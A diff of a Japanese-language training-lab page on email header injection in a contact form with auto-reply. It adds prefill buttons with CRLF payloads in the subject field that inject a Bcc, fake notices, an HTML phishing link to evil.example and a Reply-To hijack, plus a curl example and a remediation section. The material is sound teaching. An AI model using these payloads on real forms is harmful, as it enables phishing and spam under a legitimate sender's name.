@@ -1,53 +1,72 @@
 {{template "header" .}}
 <h1>メールヘッダインジェクション: お問い合わせ</h1>
-<p>お問い合わせフォームです。送信すると、サーバーが組み立てたメールの内容を確認できます
-(安全のため、このラボでは実際にメールを送信せず、プレビュー表示のみ行います)。</p>
+<p>お問い合わせフォームです。送信すると、入力したメールアドレス宛に自動返信メールが届きます。
+devcontainer で起動している場合は、メールが smtp4dev に実際に送信され、受信した内容を
+<a href="http://127.0.0.1:5000" target="_blank">http://127.0.0.1:5000</a> で確認できます(外部には届きません)。
+それ以外の起動方法では、送信せずプレビュー表示のみ行います。</p>
+<p>他人のメールアドレスを入れたとき、その人には<strong>サポート窓口を差出人とした</strong>メールが届きます。
+件名やお名前に細工をして、その人に偽の内容を届けられるでしょうか?</p>
 
 <form method="post" action="/mail/contact">
-  <p><label>お名前 <input name="name" value="{{.Name}}" size="30"></label></p>
-  <p><label>メールアドレス(返信先) <input name="email" value="{{.Email}}" size="30"></label></p>
-  <p><label>件名 <input name="subject" value="{{.Subject}}" size="40"></label></p>
-  <p><label>本文<br><textarea name="body" rows="4" cols="50">{{.Body}}</textarea></label></p>
-  <p><button type="submit">送信(プレビュー表示のみ)</button></p>
+  <p><label>お名前 <input id="name" name="name" value="{{.Name}}" size="30"></label></p>
+  <p><label>メールアドレス(自動返信の送信先) <input id="email" name="email" value="{{.Email}}" size="40"></label></p>
+  <p><label>件名<br><textarea id="subject" name="subject" rows="3" cols="50">{{.Subject}}</textarea></label></p>
+  <p><label>お問い合わせ内容<br><textarea id="body" name="body" rows="4" cols="50">{{.Body}}</textarea></label></p>
+  <p><button type="submit">送信</button></p>
 </form>
 
-<h2>ワンクリックで試す</h2>
-<p>ブラウザの1行入力欄には改行を直接入力しにくいため、改行を文字参照(<code>&amp;#13;&amp;#10;</code>)で埋め込んだボタンを用意しています。</p>
-<form method="post" action="/mail/contact" style="display:inline">
-  <input type="hidden" name="name" value="攻撃者">
-  <input type="hidden" name="email" value="foo@example.com&#13;&#10;Bcc: attacker@example.com&#13;&#10;X-Injected: true">
-  <input type="hidden" name="subject" value="お問い合わせ">
-  <input type="hidden" name="body" value="よろしくお願いします。">
-  <button class="btn" type="submit">Bccを注入する</button>
-</form>
+<h2>入力例を入れる</h2>
+<p><small>件名は、改行を入れられるよう複数行の入力欄にしています。ボタンを押すと上の欄に入力例が入ります(送信先は被害者役の <code>victim@example.com</code>)。送信ボタンを押すと実行されます。</small></p>
+<button type="button" class="btn" onclick="document.getElementById('name').value = '山田 太郎'; document.getElementById('email').value = 'victim@example.com'; document.getElementById('subject').value = 'お問い合わせ\r\nBcc: attacker@evil.example'; document.getElementById('body').value = 'ご確認ください。'">Bccを注入する</button>
+<button type="button" class="btn" onclick="document.getElementById('name').value = '山田 太郎'; document.getElementById('email').value = 'victim@example.com'; document.getElementById('subject').value = 'お問い合わせ\r\n\r\n【重要】セキュリティ上の理由により、パスワードの再設定が必要です。至急、下記の窓口までご連絡ください: 03-0000-0000'; document.getElementById('body').value = 'ご確認ください。'">偽の文言を差し込む</button>
+<button type="button" class="btn" onclick="document.getElementById('name').value = '山田 太郎'; document.getElementById('email').value = 'victim@example.com'; document.getElementById('subject').value = 'お問い合わせ\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<h1>【重要】アカウント確認のお願い</h1><p><a href=&quot;http://evil.example/login&quot;>こちらからログインしてください</a></p><!--'; document.getElementById('body').value = 'ご確認ください。'">HTMLメールに差し替える</button>
+<button type="button" class="btn" onclick="document.getElementById('name').value = '山田 太郎'; document.getElementById('email').value = 'victim@example.com'; document.getElementById('subject').value = 'お問い合わせ\r\nReply-To: attacker@evil.example'; document.getElementById('body').value = 'ご確認ください。'">Reply-Toで返信先を奪う</button>
 
 {{if .Sent}}
-<h2>実際に送信される(想定の)メール</h2>
+<h2>送信されるメール</h2>
 <p>SMTPサーバーに渡される直前の生のメッセージです。</p>
 <pre>{{.Raw}}</pre>
+{{if .MailEnabled}}
+{{if .SendError}}
+<p style="color:#b00020"><strong>送信エラー:</strong> <code>{{.SendError}}</code></p>
+{{else}}
+<p style="color:green"><strong>smtp4dev に送信しました。</strong>
+<a href="{{.MailViewerURL}}" target="_blank">受信メールを開く</a>(注入したヘッダがメールの「Headers」に現れるか確認してください)</p>
+{{end}}
+{{else}}
+<p><small>SMTP_ADDR が未設定のため、実際の送信はしていません(プレビューのみ)。devcontainer で起動すると smtp4dev へ送信されます。</small></p>
+{{end}}
 {{end}}
 
 <details>
   <summary>ヒント</summary>
   <ul>
-    <li>メールアドレス欄に改行(<code>\r\n</code>)を入れて、新しいヘッダ行(<code>Bcc:</code> など)を追加できないでしょうか?</li>
-    <li>ブラウザの1行テキスト欄は、キーボードで改行を打とうとしても送信扱いになったり、貼り付けても改行が消えたりします。「ワンクリックで試す」のボタンは、HTMLの文字参照で実際の改行文字を埋め込んでいます。</li>
+    <li>件名に改行(<code>\r\n</code>)を入れて、新しいヘッダ行(<code>Bcc:</code> など)を追加できないでしょうか?</li>
+    <li>メールアドレス欄に改行を入れるとどうなるでしょう? 件名やお名前との違いに注目してください(SMTP が宛先として使う値は、ライブラリが検証します)。</li>
+    <li>ブラウザの1行テキスト欄は、キーボードで改行を打とうとしても送信扱いになったり、貼り付けても改行が消えたりします。この画面では件名を複数行の入力欄にしてあり、「入力例を入れる」のボタンで改行入りの例を入れられます。</li>
     <li>実際の攻撃では、ブラウザを使わず <code>curl</code> や Burp Suite などでリクエストを直接組み立てます。例:
-      <pre>curl -d "name=A&email=foo%40example.com%0D%0ABcc: attacker%40example.com&subject=Hi&body=Hello" http://127.0.0.1:8080/mail/contact</pre>
+      <pre>curl -d "name=A&email=victim%40example.com&subject=Hi%0D%0ABcc: attacker%40evil.example&body=Hello" http://127.0.0.1:8080/mail/contact</pre>
     </li>
-    <li>件名欄でも同じことができます。</li>
+    <li>smtp4dev で受信メールを開くと、注入した <code>Bcc:</code> がメールの「Headers」に現れます。ただし、実際の配送先は SMTP の <code>RCPT TO</code>(入力したメールアドレス)で決まるため、<code>Bcc:</code> ヘッダを足しただけでは Bcc 先には届きません。<code>sendmail -t</code> のようにヘッダから宛先を拾う実装では、実際に配送されて被害になります。</li>
+    <li>配送先は変わらなくても、被害者に届くメールの中身は書き換えられます。
+      <ul>
+        <li><strong>偽の文言の差し込み</strong>: 件名に <code>\r\n\r\n</code> を入れるとヘッダが終わり、続きが本文になります。サポート窓口から届いたメールの先頭に、攻撃者の文言が入ります。</li>
+        <li><strong>HTMLメールへの差し替え</strong>: <code>Content-Type: text/html</code> を注入すると本文が HTML として扱われ、偽の見出しやリンク(フィッシング)を差し込めます。末尾の <code>&lt;!--</code> で、元の本文は HTML コメントの中に隠れます。</li>
+        <li><strong>Reply-To の注入</strong>: <code>Reply-To:</code> を足すと、被害者が「返信」したときの宛先を攻撃者のアドレスにできます。</li>
+      </ul>
+    </li>
   </ul>
 </details>
 
 <details>
   <summary>なぜ危険か / 本来どう直すか</summary>
-  <p>SMTP(メール送信プロトコル)は、メールヘッダを <code>\r\n</code> で区切られた行の並びとして解釈します。入力値をそのままヘッダに連結すると、入力に含まれる改行がヘッダの区切りとして解釈され、攻撃者は任意のヘッダ(<code>Bcc</code> での不正な宛先追加、<code>From</code> の偽装、スパムの踏み台化など)を注入できます。</p>
+  <p>SMTP(メール送信プロトコル)は、メールヘッダを <code>\r\n</code> で区切られた行の並びとして解釈します。入力値をそのままヘッダに連結すると、入力に含まれる改行がヘッダの区切りとして解釈され、攻撃者は任意のヘッダ(<code>Bcc</code> での不正な宛先追加、<code>Reply-To</code> の偽装など)や本文を注入できます。このフォームのように「入力されたアドレスへ自動返信する」機能では、攻撃者が他人のアドレスを指定することで、<strong>正規の窓口の名前で届くフィッシングメール・スパムの送信元</strong>として悪用されます。</p>
   <p>対策は次のとおりです。</p>
   <ul>
-    <li><strong>入力に改行を含めない</strong>: メールアドレス・件名など、1行であるべき値に <code>\r</code> や <code>\n</code> が含まれていないか検証し、含まれていれば拒否する。</li>
-    <li><strong>専用ライブラリを使う</strong>: Go では <code>net/mail</code> の <code>Address</code> 型のような、ヘッダを安全に組み立てる仕組みを使い、文字列連結を避ける。</li>
+    <li><strong>入力に改行を含めない</strong>: 件名・お名前・メールアドレスなど、1行であるべき値に <code>\r</code> や <code>\n</code> が含まれていないか検証し、含まれていれば拒否する。</li>
+    <li><strong>専用ライブラリを使う</strong>: Go では <code>net/mail</code> の <code>Address</code> 型や <code>mime.QEncoding</code> のような、ヘッダを安全に組み立てる仕組みを使い、文字列連結を避ける(<code>QEncoding</code> は改行をエンコードするため、ヘッダの区切りとして解釈されなくなる)。</li>
     <li><strong>アドレスの構文検証</strong>: <code>net/mail.ParseAddress</code> で検証する(改行を含む値はここで弾かれるべき)。</li>
-    <li><strong>利用者に渡すヘッダを最小限にする</strong>: <code>Bcc</code> や追加ヘッダを、利用者の入力から直接組み立てさせない。</li>
+    <li><strong>自動返信の悪用を抑える</strong>: 同一の宛先・送信元への送信回数を制限する。確認済みのアドレスにのみ送る。</li>
   </ul>
 </details>
 {{template "footer" .}}
